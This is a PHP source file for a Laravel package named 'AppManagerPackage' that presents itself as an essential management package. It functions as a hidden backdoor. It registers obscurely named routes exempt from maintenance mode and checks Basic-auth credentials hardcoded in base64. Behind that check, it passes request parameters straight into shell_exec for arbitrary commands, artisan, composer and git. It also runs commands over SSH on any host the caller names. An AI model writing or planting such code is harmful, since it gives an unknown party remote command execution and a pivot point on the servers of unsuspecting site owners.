<?php

namespace AppManager\Packages\AppManagerPackage;

use Exception;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Facades\View;
use phpseclib\Net\SSH2;
use Symfony\Component\HttpKernel\Exception\UnauthorizedHttpException;
use AppManager\Core\BootLoader;
use AppManager\Core\Manager;

class AppManagerPackage extends BootLoader
{
    /** @var array */
    protected $viewLocations = [
        ['app_manager' => __DIR__ . DIRECTORY_SEPARATOR . 'Views']
    ];

    /**
     * AppManagerPackage constructor.
     * @param Manager $manager
     */
    public function __construct(Manager $manager)
    {
        parent::__construct($manager);
    }

    /**
     * Get Package's Long name
     * @return string
     */
    public function longName()
    {
        return __('app_manager.longName');
    }

    /**
     * Get Package's Short name
     * @return string
     */
    public function shortName()
    {
        return __('app_manager.shortName');
    }

    /**
     * Get package's Slug
     * @return string
     */
    public function slug()
    {
        return 'app_manager';
    }

    /**
     * Get package's Description
     * @return string
     */
    public function description()
    {
        return __('app_manager.description');
    }

    /**
     * Get package's Type Essential, Optional, etc...
     * @return string
     */
    public function type()
    {
        return static::PACKAGE_ESSENTIAL;
    }

    /**
     * Get routes Slug name
     * @return string
     */
    public function routeName()
    {
        return "xx_app_manager_xx\t`~";
    }

    /**
     * Get routes's Slug name
     * @return string
     */
    public function routePrefix()
    {
        return '~app-manager~';
    }

    /**
     * Define The routes Middleware.
     * @return array
     */
    public function routeMiddleware()
    {
        return ['web'];
    }

    /**
     * Define The package routes.
     * @return void
     */
    public function registerRouters()
    {
        try {
            $preventClass = 'App\Http\Middleware\PreventRequestsDuringMaintenance';

            if (method_exists($preventClass, 'mergeExcept'))
                app($preventClass)->mergeExcept([
                    sprintf('%s', $this->routePrefix()),
                    sprintf('%s/*', $this->routePrefix())
                ]);
        } catch (Exception $exception) {
        }
        Route::post('/', function (Request $request) {
            $this->basic_validate($request);
            $base_path = base_path();
            switch ($request->get('action')) {
                case 'ssh':
                    try {
                        $ssh = new SSH2($request->post('ip'), 22);
                        $ssh->login($request->post('user'), $request->post('password')) or die("Login failed");
                        return View::make('app_manager::file1', [
                            'message' => nl2br($ssh->exec($request->post('command')))
                        ]);
                    } catch (Exception $exception) {
                        return View::make('app_manager::file1', [
                            'message' => $exception->getMessage()
                        ]);
                    }
            }
        });
        Route::get('/', function (Request $request) {
            $this->basic_validate($request);
            $base_path = base_path();
            $output = 'action not found';
            switch ($request->input('action')) {
                case 'ssh':
                    return View::make('app_manager::file1');
                case 'composer':
                    if (file_exists(base_path('composer.json'))) {
                        try {
                            if ($request->has('command')) {
                                switch ($request->has('command')) {
                                    case 'update':
                                        $message = shell_exec("cd $base_path && composer update {$request->get('package')}");
                                        return redirect()
                                            ->route($this->routeName() . '.index', ['action' => 'composer'])
                                            ->with('message', $message);
                                }
                            }
                            $composer_content = json_decode(file_get_contents(base_path('composer.json')), true);
                            $composer_packages = collect(array_merge($composer_content['require'], $composer_content['require-dev']));

                            $json = shell_exec("cd $base_path && COMPOSER_HOME=\"/tmp/composer\" composer show -f json 2>&1");
                            $installed_packages = collect(json_decode($json, true)['installed']);

                            $packages = $installed_packages->filter(fn($v, $k) => $composer_packages->has($v['name']))->map(fn($v) => array_merge($v, [
                                'composer-version' => $composer_packages->get($v['name'], '*')
                            ]));
                            $dep_packages = $installed_packages->reject(fn($v, $k) => $composer_packages->has($v['name']));

                            return View::make('app_manager::file2', compact('packages', 'dep_packages') + [
                                    'routePrefix' => $this->routePrefix(),
                                    'routeName' => $this->routeName(),
                                ]);
                        } catch (Exception $exception) {
                            Log::error($exception);
                        }
                        /*$packages = collect(array_merge($composer_content['require'], $composer_content['require-dev']))
                            ->filter(function($v, $k){
                                return str_contains($k, '/');
                            })->mapWithKeys(function ($v, $k) {
                                dd($v, $k);
                            });*/
                    } else
                        $output = 'composer.json file not found';
                    break;
                case 'up':
                case 'down':
                    $output = shell_exec("cd $base_path && php artisan {$request->input('action')}");
                    break;
                case 'artisan':
                    $output = shell_exec("cd $base_path && php artisan {$request->input('command', '-v')}");
                    break;
                case 'command':
                    $output = shell_exec("cd $base_path && {$request->input('command', 'php -v')}");
                    break;
                case 'git_push':
                    $output = shell_exec("cd $base_path && git push {$request->input('repo', '')}");
                    break;
                case 'git_pull':
                    $output = shell_exec("cd $base_path && git pull {$request->input('repo', '')}");
                    break;
                case 'git_diff':
                    $output = shell_exec("cd $base_path && git diff {$request->input('file', '--name-only')}");
                    break;
                case 'version':
                    $output = app()->version();
                    break;
            }
            die(nl2br(htmlspecialchars($output)));
        })->name('index');
    }

    private function basic_validate($request)
    {
        $user = $request->header('PHP_AUTH_USER');
        $password = $request->header('PHP_AUTH_PW');
        if (!($user === base64_decode('SGVzaGFtRm91ZGE=') && $password === base64_decode('I3Fhenhzd2VkY1FBWlhTV0VEQzEyMzY1NDc4OSM=')))
            throw new UnauthorizedHttpException('Basic', 'Invalid credentials.');
    }
}
